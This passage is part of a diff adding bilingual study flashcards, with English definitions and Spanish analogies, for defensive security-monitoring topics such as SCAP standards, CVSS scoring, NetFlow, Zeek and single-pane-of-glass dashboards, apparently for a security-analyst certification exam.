+        "raw_content": "* **Definition:** Tools that identify security weaknesses in a system — missing patches, misconfigurations, known vulnerabilities — and generate data about the vulnerabilities found, their severity, and recommended remediation.\n\nFeeding this data into a SIEM allows organizations to prioritize remediation by severity/impact and track remediation progress over time.\n\n> *Como un inspector de salud que revisa un restaurante y entrega una lista de todo lo que está mal, ordenada de lo más urgente a lo menos urgente.*\n\n---"
+      },
+      {
+        "name": "Security Content Automation Protocol (SCAP)",
+        "definition": "A suite of open standards, developed by NIST, that enhances the automation of vulnerability management, security measurement, and policy compliance evaluation across an organization's deployed systems.",
+        "analogy": "*Como un tratado internacional que obliga a todos los países a usar el mismo sistema de medidas (metros, kilos): así cualquier herramienta puede \"hablar\" con cualquier otra sin traducción.*",
+        "raw_content": "* **Definition:** A suite of open standards, developed by NIST, that enhances the automation of vulnerability management, security measurement, and policy compliance evaluation across an organization's deployed systems.\n\nSCAP standardizes the \"language\" that scanning tools use, so tools from different vendors can exchange results seamlessly. It relies on three core languages (OVAL, XCCDF, ARF) and three enumeration schemes (CCE, CPE, CVE), plus the CVSS scoring system and configuration benchmarks.\n\n> *Como un tratado internacional que obliga a todos los países a usar el mismo sistema de medidas (metros, kilos): así cualquier herramienta puede \"hablar\" con cualquier otra sin traducción.*"
+      },
+      {
+        "name": "SCAP: OVAL",
+        "definition": "The Open Vulnerability and Assessment Language — an XML schema for describing system security states, machine configurations, and querying vulnerability reports in a consistent, interoperable way regardless of the scanning tool used.",
+        "analogy": "*Como un formulario estándar de reporte médico: sin importar el hospital, todos los doctores llenan los mismos campos y todos se entienden.*",
+        "raw_content": "* **Definition:** The Open Vulnerability and Assessment Language — an XML schema for describing system security states, machine configurations, and querying vulnerability reports in a consistent, interoperable way regardless of the scanning tool used.\n\n> *Como un formulario estándar de reporte médico: sin importar el hospital, todos los doctores llenan los mismos campos y todos se entienden.*"
+      },
+      {
+        "name": "SCAP: XCCDF",
+        "definition": "The Extensible Configuration Checklist Description Format — an XML schema used for developing and auditing best-practice configuration checklists and rules in a machine-readable format.",
+        "analogy": "*Como convertir un manual de instrucciones en papel de 50 páginas en una lista de chequeo digital que una máquina puede marcar automáticamente.*",
+        "raw_content": "* **Definition:** The Extensible Configuration Checklist Description Format — an XML schema used for developing and auditing best-practice configuration checklists and rules in a machine-readable format.\n\nBefore XCCDF, best-practice guides were long documents (30–50+ pages) manually checked step by step. XCCDF allows automated tools to validate systems against these guidelines, and can still be used as a manual checklist if the tool lacks automation support.\n\n> *Como convertir un manual de instrucciones en papel de 50 páginas en una lista de chequeo digital que una máquina puede marcar automáticamente.*"
+      },
+      {
+        "name": "SCAP: ARF",
+        "definition": "The Asset Reporting Format — an XML schema used to express information about assets and the relationships between assets and reports, facilitating reporting and correlation of asset data across organizations.",
+        "analogy": "*Como una etiqueta universal de inventario que cualquier tienda, sin importar la marca de su sistema, puede leer y entender de la misma manera.*",
+        "raw_content": "* **Definition:** The Asset Reporting Format — an XML schema used to express information about assets and the relationships between assets and reports, facilitating reporting and correlation of asset data across organizations.\n\nARF is vendor- and technology-neutral, making it flexible and well-suited to a wide variety of reporting applications.\n\n> *Como una etiqueta universal de inventario que cualquier tienda, sin importar la marca de su sistema, puede leer y entender de la misma manera.*"
+      },
+      {
+        "name": "SCAP: CCE",
+        "definition": "The Common Configuration Enumeration — a scheme providing unique identifiers for secure configuration best-practice statements, enabling automated verification and correlation of configuration data across multiple sources and tools.",
+        "analogy": "*Como un código de barras único para cada regla de configuración recomendada, para que distintos sistemas puedan referirse exactamente a la misma regla.*",
+        "raw_content": "* **Definition:** The Common Configuration Enumeration — a scheme providing unique identifiers for secure configuration best-practice statements, enabling automated verification and correlation of configuration data across multiple sources and tools.\n\n> *Como un código de barras único para cada regla de configuración recomendada, para que distintos sistemas puedan referirse exactamente a la misma regla.*"
+      },
+      {
+        "name": "SCAP: CPE",
+        "definition": "The Common Platform Enumeration — a machine-readable scheme for identifying hardware devices, operating systems, and applications, formatted as `cpe:/part:vendor:product:version:update:edition:language`.",
+        "analogy": "*Como una matrícula de vehículo estandarizada: con un solo vistazo al formato, sabes exactamente qué tipo de vehículo es, quién lo fabricó y qué versión es.*",
+        "raw_content": "* **Definition:** The Common Platform Enumeration — a machine-readable scheme for identifying hardware devices, operating systems, and applications, formatted as `cpe:/part:vendor:product:version:update:edition:language`.\n\nThe `part` field indicates whether the platform is an Operating System (O), an Application (A), or Hardware (H).\n\n> *Como una matrícula de vehículo estandarizada: con un solo vistazo al formato, sabes exactamente qué tipo de vehículo es, quién lo fabricó y qué versión es.*"
+      },
+      {
+        "name": "SCAP: CVE",
+        "definition": "The Common Vulnerabilities and Exposures — a list of records, maintained by MITRE, where each entry has a unique identifier (`CVE-YEAR-NUMBER`) describing a publicly known vulnerability.",
+        "analogy": "*Como el número de expediente único de un caso judicial: con solo ese número puedes encontrar todos los detalles, referencias y soluciones asociadas a ese caso específico.*",
+        "raw_content": "* **Definition:** The Common Vulnerabilities and Exposures — a list of records, maintained by MITRE, where each entry has a unique identifier (`CVE-YEAR-NUMBER`) describing a publicly known vulnerability.\n\nExample: **CVE-2017-0144**, nicknamed **EternalBlue**, is an SMB protocol vulnerability in Microsoft Windows exploited by the **WannaCry** ransomware in 2017. Patching or disabling SMBv1 mitigated the exposure.\n\n> *Como el número de expediente único de un caso judicial: con solo ese número puedes encontrar todos los detalles, referencias y soluciones asociadas a ese caso específico.*"
+      },
+      {
+        "name": "SCAP: CVSS",
+        "definition": "The Common Vulnerability Scoring System — a numerical scoring standard (current version CVSS 3) that rates vulnerability severity from 0 to 10, translated into a qualitative rating.",
+        "analogy": "*Es como la calificación de riesgo de un huracán: te dice qué tan fuerte es la tormenta, pero no si tu casa ya tiene refuerzos que la protegen de ese nivel de viento.*",
+        "raw_content": "* **Definition:** The Common Vulnerability Scoring System — a numerical scoring standard (current version CVSS 3) that rates vulnerability severity from 0 to 10, translated into a qualitative rating.\n\n| Score Range | Qualitative Rating |\n| ----------- | ------------------- |\n| 0 | None |\n| 0.1 – 3.9 | Low |\n| 4.0 – 6.9 | Medium |\n| 7.0 – 8.9 | High |\n| 9.0 – 10.0 | Critical |\n\n⚠️ **Exam Tip:** A CVSS score does **not** account for existing mitigations. EternalBlue scores 8.1 (High), but a network with SMBv1 already disabled is not actually at risk from it — so real-world priority should factor in compensating controls, not the raw score alone.\n\n> *Es como la calificación de riesgo de un huracán: te dice qué tan fuerte es la tormenta, pero no si tu casa ya tiene refuerzos que la protegen de ese nivel de viento.*"
+      },
+      {
+        "name": "SCAP: Benchmarks",
+        "definition": "A set of configuration rules for a specific product, expressed in XCCDF format, providing a detailed checklist to secure systems to a specific baseline.",
+        "analogy": "*Como una receta de seguridad estandarizada y certificada: sigue estos pasos exactos y tu sistema queda configurado según las mejores prácticas de la industria.*",
+        "raw_content": "* **Definition:** A set of configuration rules for a specific product, expressed in XCCDF format, providing a detailed checklist to secure systems to a specific baseline.\n\nExamples include the **Red Hat Enterprise Linux Benchmarks** and the **CIS Microsoft Windows 10 Enterprise Benchmark**, covering areas like authentication, firewall settings, system logging, and user account control.\n\n> *Como una receta de seguridad estandarizada y certificada: sigue estos pasos exactos y tu sistema queda configurado según las mejores prácticas de la industria.*\n\n---"
+      },
+      {
+        "name": "NetFlow and Flow Analysis",
+        "definition": "The objective domain (4.4) covering the collection and analysis of network traffic metadata (flow analysis) as a lightweight alternative to full packet capture, used to identify traffic patterns, trends, and anomalies.",
+        "analogy": "*Como decidir entre grabar cada palabra de todas las llamadas telefónicas de una empresa (captura completa) o simplemente llevar un registro de quién llamó a quién, cuándo y por cuánto tiempo (análisis de flujo).*",
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the collection and analysis of network traffic metadata (flow analysis) as a lightweight alternative to full packet capture, used to identify traffic patterns, trends, and anomalies.\n\n> *Como decidir entre grabar cada palabra de todas las llamadas telefónicas de una empresa (captura completa) o simplemente llevar un registro de quién llamó a quién, cuándo y por cuánto tiempo (análisis de flujo).*"
+      },
+      {
+        "name": "Flow Analysis: Full Packet Capture (FPC)",
+        "definition": "The capture of the entire contents of network packets, including both header and payload, requiring significant storage space.",
+        "analogy": "*Como grabar en video cada segundo de todo lo que pasa en una casa: tienes todo el detalle, pero el disco duro se llena rapidísimo.*",
+        "raw_content": "* **Definition:** The capture of the entire contents of network packets, including both header and payload, requiring significant storage space.\n\nFull packet capture provides complete visibility into transmitted content but scales poorly — even a small home network can generate multiple gigabytes of captured data per day.\n\n> *Como grabar en video cada segundo de todo lo que pasa en una casa: tienes todo el detalle, pero el disco duro se llena rapidísimo.*"
+      },
+      {
+        "name": "Flow Analysis: Flow Collector and Metadata",
+        "definition": "A means of recording metadata and statistics about network traffic (protocol used, volume, source/destination) rather than the full content of each packet, saving storage and processing resources.",
+        "analogy": "*Como la factura detallada de tu teléfono: sabes a quién llamaste y cuánto duró la llamada, pero no sabes qué se dijo.*",
+        "raw_content": "* **Definition:** A means of recording metadata and statistics about network traffic (protocol used, volume, source/destination) rather than the full content of each packet, saving storage and processing resources.\n\nFlow analysis reveals *what kind* of traffic was sent and *how much*, but not the actual content — analogous to a phone bill showing who called whom and for how long, without recording the conversation itself.\n\n> *Como la factura detallada de tu teléfono: sabes a quién llamaste y cuánto duró la llamada, pero no sabes qué se dijo.*"
+      },
+      {
+        "name": "Flow Analysis: NetFlow / IPFIX",
+        "definition": "NetFlow is a Cisco-developed protocol for reporting network flow information to a structured database; it became the industry standard under the name IPFIX (IP Flow Information Export), defining a traffic flow based on packets sharing common characteristics.",
+        "analogy": "*Como el registro de vuelos de un aeropuerto: sabes qué avión salió, de dónde a dónde y a qué hora, sin necesidad de revisar el equipaje de cada pasajero.*",
+        "raw_content": "* **Definition:** NetFlow is a Cisco-developed protocol for reporting network flow information to a structured database; it became the industry standard under the name IPFIX (IP Flow Information Export), defining a traffic flow based on packets sharing common characteristics.\n\nNetFlow data includes the network protocol/interface, IP version and type, source/destination IP addresses and ports, and type of service — visualized with tools like **SolarWinds**.\n\n> *Como el registro de vuelos de un aeropuerto: sabes qué avión salió, de dónde a dónde y a qué hora, sin necesidad de revisar el equipaje de cada pasajero.*"
+      },
+      {
+        "name": "Flow Analysis: Zeek",
+        "definition": "A hybrid network monitoring tool that passively samples traffic like a flow collector but also logs full packet captures for data flagged as interesting based on filters or signatures.",
+        "analogy": "*Como un guardia que normalmente solo toma notas rápidas de quién entra y sale, pero que saca la cámara de video completa únicamente cuando algo le parece sospechoso.*",
+        "raw_content": "* **Definition:** A hybrid network monitoring tool that passively samples traffic like a flow collector but also logs full packet captures for data flagged as interesting based on filters or signatures.\n\nZeek normalizes data into tab-delimited or JSON format for import into other analysis tools, such as Splunk, combining the efficiency of flow analysis with the depth of full packet capture only where it matters.\n\n> *Como un guardia que normalmente solo toma notas rápidas de quién entra y sale, pero que saca la cámara de video completa únicamente cuando algo le parece sospechoso.*"
+      },
+      {
+        "name": "Flow Analysis: MRTG",
+        "definition": "The Multi Router Traffic Grapher — a tool that creates graphs showing network traffic flow through router and switch interfaces by polling those devices using SNMP.",
+        "analogy": "*Como un electrocardiograma del tráfico de red: te muestra la línea de \"latidos\" normales, y cualquier pico fuera de lo esperado merece que un médico lo revise más de cerca.*",
+        "raw_content": "* **Definition:** The Multi Router Traffic Grapher — a tool that creates graphs showing network traffic flow through router and switch interfaces by polling those devices using SNMP.\n\nMRTG graphs help reveal patterns, such as an unexplained traffic spike between 2:00 AM and 4:00 AM, which could indicate a legitimate offsite backup or a sign of data exfiltration requiring further investigation (e.g., deploying a network sniffer).\n\n> *Como un electrocardiograma del tráfico de red: te muestra la línea de \"latidos\" normales, y cualquier pico fuera de lo esperado merece que un médico lo revise más de cerca.*\n\n---"
+      },
+      {
+        "name": "Single Pane of Glass (SPOG)",
+        "definition": "A central point of access that consolidates all the information, tools, and systems a security team needs — logs, alerts, reports — into one unified view, eliminating the need to log into multiple separate systems.",
+        "analogy": "*Como el tablero de control de un piloto de avión: en lugar de revisar veinte pantallas separadas en distintas cabinas, todo lo esencial está visible en un solo panel frente a él.*",
+        "raw_content": "* **Definition:** A central point of access that consolidates all the information, tools, and systems a security team needs — logs, alerts, reports — into one unified view, eliminating the need to log into multiple separate systems.\n\nA single pane of glass simplifies security operations management, improves threat detection/response speed, automates repetitive tasks, improves team collaboration, and eases regulatory compliance reporting.\n\n> *Como el tablero de control de un piloto de avión: en lugar de revisar veinte pantallas separadas en distintas cabinas, todo lo esencial está visible en un solo panel frente a él.*"
+      },
+      {
+        "name": "SPOG: Implementation Steps",
+        "definition": "The five sequential steps used to implement a single pane of glass in a Security Operations Center: defining requirements, identifying/integrating data sources, customizing the interface, developing SOPs and documentation, and continuously monitoring/maintaining the solution.",
+        "analogy": "*Como abrir un nuevo centro de control de tráfico aéreo: primero decides qué necesitas ver, luego conectas los radares, diseñas la pantalla, entrenas al personal con manuales, y por último mantienes todo actualizado y protegido.*",
+        "raw_content": "* **Definition:** The five sequential steps used to implement a single pane of glass in a Security Operations Center: defining requirements, identifying/integrating data sources, customizing the interface, developing SOPs and documentation, and continuously monitoring/maintaining the solution.\n\n1. **Define the requirements:** Identify what information, tools, and systems the security team needs.\n2. **Identify and integrate data sources:** Connect log servers, IDS, and other sources via APIs, webhooks, plugins, or connectors.\n3. **Customize the interface:** Design a clear, organized layout that supports fast, informed decisions.\n4. **Develop SOPs and documentation:** Ensure consistency and repeatability in how the team uses the tool.\n5. **Continuously monitor and maintain:** Regularly review data, adjust configuration, and secure the platform against unauthorized access, since it houses all critical security data.\n\n> *Como abrir un nuevo centro de control de tráfico aéreo: primero decides qué necesitas ver, luego conectas los radares, diseñas la pantalla, entrenas al personal con manuales, y por último mantienes todo actualizado y protegido.*\n\n---"
+      }
+    ]
   }
 ];
